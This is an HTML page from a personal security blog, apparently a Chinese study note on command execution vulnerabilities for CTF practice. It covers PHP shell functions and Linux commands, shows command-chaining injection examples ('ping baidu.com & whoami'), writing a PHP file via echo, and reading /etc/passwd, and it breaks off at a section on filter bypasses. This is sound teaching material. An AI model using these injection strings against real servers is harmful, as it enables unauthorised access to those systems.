@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>命令执行漏洞 | chickenmushroom&#39;s blog</title>
+  <meta name="description" content="命令执行漏洞命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一。 这个漏洞存在的危害：  获取WEB服务器权限，执行系统命令和读取文件 反弹shell 控制整个网站甚至整个服务器  常见函数 常见的命令执行漏洞有：  12345system()passthru()exec()shell_exec()popen()  认识一下以上函数以及他们的用法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行漏洞">
+<meta property="og:url" content="http://example.com/2021/11/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="命令执行漏洞命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一。 这个漏洞存在的危害：  获取WEB服务器权限，执行系统命令和读取文件 反弹shell 控制整个网站甚至整个服务器  常见函数 常见的命令执行漏洞有：  12345system()passthru()exec()shell_exec()popen()  认识一下以上函数以及他们的用法">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210321220951440.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210323124219358.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210323124322666.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210323124556441.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210323125332632.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210323125421161.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210323125945669.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210323130001586.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210323131356076.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210323130139747.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210323130443455.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210323130904649.png">
+<meta property="article:published_time" content="2021-11-14T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-11-16T00:24:38.291Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cr_7.gitee.io/git-hub-image/image-20210321220951440.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://example.com/2021/11/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/cofess" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">chickenmushroom</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Web</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Guangzhou, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="/null" target="_blank" title="Github" ><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Weibo" ><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Twitter" ><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Behance" ><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" ><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/" rel="tag">PHP小项目</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WriteUp/" rel="tag">WriteUp</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a><span class="tag-list-count">15</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/" style="font-size: 13px;">PHP小项目</a> <a href="/tags/WriteUp/" style="font-size: 13.5px;">WriteUp</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 14px;">学习笔记</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a><span class="archive-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/15/ciscn2021%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA/" class="title">ciscn2021半决赛-华南赛区</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/15/ciscn2021%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%A2%84%E8%B5%9B/" class="title">ciscn2021华南赛区预赛</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/15/SQL%E6%B3%A8%E5%85%A5/" class="title">SQL注入总结</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/15/docker%E5%85%A5%E9%97%A8%E5%88%B0%E9%83%A8%E7%BD%B2/" class="title">docker入门到部署</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8Bweb%E5%92%8Cmisc/" class="title">攻防世界新手web和misc</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">Catalogue</h3>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.1.</span> <span class="toc-text">常见函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="toc-number">1.0.2.</span> <span class="toc-text">常用指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E5%AD%97%E7%AC%A6"><span class="toc-number">1.0.3.</span> <span class="toc-text">连接字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6"><span class="toc-number">1.0.4.</span> <span class="toc-text">重要文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.0.5.</span> <span class="toc-text">绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BC%80%E9%99%90%E5%88%B6"><span class="toc-number">1.0.5.1.</span> <span class="toc-text">前缀限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">1.0.5.2.</span> <span class="toc-text">空格过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4"><span class="toc-number">1.0.5.3.</span> <span class="toc-text">黑名单过滤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DVWA%E5%AE%9E%E8%B7%B5"><span class="toc-number">1.0.6.</span> <span class="toc-text">DVWA实践</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%AE%A4%E9%9D%B6%E5%9C%BA"><span class="toc-number">1.0.7.</span> <span class="toc-text">工作室靶场</span></a></li></ol></li></ol></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-命令执行漏洞" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      命令执行漏洞
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2021/11/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+	  <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
+	</a>
+</span>
+        
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/11/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><p>命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一。</p>
+<p>这个漏洞存在的危害：</p>
+<ul>
+<li>获取WEB服务器权限，执行系统命令和读取文件</li>
+<li>反弹shell</li>
+<li>控制整个网站甚至整个服务器</li>
+</ul>
+<h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><ul>
+<li>常见的命令执行漏洞有：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">passthru()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">popen()</span><br></pre></td></tr></table></figure>
+
+<p>认识一下以上函数以及他们的用法：</p>
+<ul>
+<li>system():</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system ( string `$command` [, int `&amp;$return_var` ] ) : string</span><br></pre></td></tr></table></figure>
+
+<p>system()函数和其它语言中的差不多，它执行给定的命令，输出和返回结果。第二个参数是可选的，用来得到命令执行后的状态码。 </p>
+<p>例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">&quot;dir&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//相当于执行dir命令，查看当前目录</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>passthru():</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void passthru (string command [, int return_var]) </span><br></pre></td></tr></table></figure>
+
+<p>passthru() 允许运行外部程序，并在屏幕上显示结果。不需要使用 echo 或 return 来查看结果；它们会显示在浏览器上。</p>
+<p>例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">passthru(<span class="string">&quot;dir&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>exec():</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) : string</span><br></pre></td></tr></table></figure>
+
+<p>exec()函数与system()类似，也执行给定的命令，但不输出结果，而是返回结果的最后一行。所以我们需要打印才能看见结果。</p>
+<p>例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;dir&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>shell_exec():</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell_exec ( string $cmd ) : string</span><br></pre></td></tr></table></figure>
+
+<p>用于通过shell执行命令并以字符串的形式返回完整的输出。</p>
+<p>例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span>(shell_exec(<span class="string">&quot;dir&quot;</span>)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>popen():</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen ( string $command , string $mode ) : resource</span><br></pre></td></tr></table></figure>
+
+<p>popen()函数打开一个进程管道来执行给定的命令(该进程由派生给定的 command 命令执行而产生)，返回一个文件句柄。</p>
+<p>例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fp</span>=popen(<span class="string">&quot;/bin/ls -l&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><p>服务器基本都是在Linux下运行的，所以这里介绍的都是Linux指令。</p>
+<ul>
+<li>显示当前目录内容</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir（windows下用）</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看当前用户</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">users</span><br><span class="line">whoami</span><br><span class="line">who am i</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看当前绝对路径</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>切换路径</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">进入目录：</span><br><span class="line">cd xxx</span><br><span class="line">cd./xxx</span><br><span class="line"></span><br><span class="line">退出目录：</span><br><span class="line">cd ..</span><br><span class="line">cd ../</span><br><span class="line">cd /</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看文件内容：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat /flag    由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac /flag    从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more /flag   根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less /flag   和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head /flag   只显示头几行</span><br><span class="line">tail /flag   只显示最后几行</span><br><span class="line">nl   /flag   类似于cat -n，显示时输出行号</span><br><span class="line">sort /flag	 命令用于将文本文件内容加以排序	</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看文件位置</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#find /tmp/ -name &#x27;*lock*&#x27;           查询文件名中包含lock的文件所在路径</span><br><span class="line">#find /tmp/ -name &#x27;lock*&#x27;            查询文件名以lock开头的文件所在路径</span><br><span class="line">#find /tmp/ -name &#x27;*lock&#x27;            查询文件名以lock结尾的文件所在路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>打印：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;123&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以就可以用echo写文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;flag&quot;&gt;hacker.txt 即生成一个内容为flag的hacker.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>base64加解密：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">加密：</span><br><span class="line">echo &#x27;Hello World&#x27; | base64</span><br><span class="line">SGVsbG8gV29ybGQK</span><br><span class="line">解密：</span><br><span class="line">echo SGVsbG8gV29ybGQK | base64 -d </span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure>
+
+<h3 id="连接字符"><a href="#连接字符" class="headerlink" title="连接字符"></a>连接字符</h3><ul>
+<li>系统命令中执行同时执行多条命令的方法</li>
+<li>管道符“&amp; 和&amp;&amp;”</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a &amp; b 表示a和b同时运行</span><br><span class="line">a &amp;&amp; b表示 a运行成功后再运行b(如果a假，则直接结束)</span><br><span class="line">例如： ping baidu.com &amp; whoami</span><br><span class="line">	  ping baidu.com &amp;&amp; whoami</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>管道符“|”</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第一个命令command 1执行的结果作为command 2的输入传给command 2</span><br><span class="line"></span><br><span class="line">例如：echo &quot;admi3n&quot;|grep &quot;3&quot; 先打印&quot;admi3n&quot;这个字符串，将打印的字符串传给第二个grep命令，也就是说grep命令要在字符串中搜索含有3的内容。这样也能够给执行两条命令</span><br><span class="line"></span><br><span class="line">例如：cat /flag|ls 表示把cat /flag的输出结果作为ls的参数</span><br></pre></td></tr></table></figure>
+
+<p>这个和SQL 注入漏洞差不多，就比如分号“ ‘ ‘”，“union select”等后面输入我们想要执行的代码</p>
+<ul>
+<li>管道符“||”</li>
+</ul>
+<p>先执行前一条语句，如果前面为假，再执行后一条语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如：ping 1 || whoami</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>管道符“;”</li>
+</ul>
+<p>执行完前面的语句在执行后面的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls|whoami</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&gt;</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php phpinfo();?&gt;&quot; &gt;hack.php 表示将php代码写进hack.php中</span><br><span class="line"></span><br><span class="line">ls&gt;hack.txt  表示将ls的输出结果写入hack.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>&gt;&gt;</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;123&quot;&gt;&gt;hack.txt 表示将123追加到hack.txt内容后面</span><br></pre></td></tr></table></figure>
+
+<p>演示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;123&quot;&gt;1.txt</span><br><span class="line">echo &quot;456&quot;&gt;&gt;1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210321220951440.png" alt="image-20210321220951440"></p>
+<h3 id="重要文件"><a href="#重要文件" class="headerlink" title="重要文件"></a>重要文件</h3><p>/etc/passwd文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该文件中包含了所有用户登录名清单；为所有用户指定了主目录；在登录时使用的shell程序名称等。该文件还保存了用户口令；给每个用户提供系统识别号</span><br></pre></td></tr></table></figure>
+
+
+<p>该文件在linux系统下是必不可少的，并且通常来说如果不特别做权限设置，以我们web服务下常用的www用户组是具有该文件的读权限的，因此当我们需要验证该漏洞是否可以被利用时会去尝试读取该文件。</p>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>我们面对命令执行漏洞，一般都需要绕过限制。下面讲一下绕过方法</p>
+<h4 id="前缀限制"><a href="#前缀限制" class="headerlink" title="前缀限制"></a>前缀限制</h4><p><strong>分号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls;whoami</span><br></pre></td></tr></table></figure>
+
+<p><strong>连接符</strong></p>
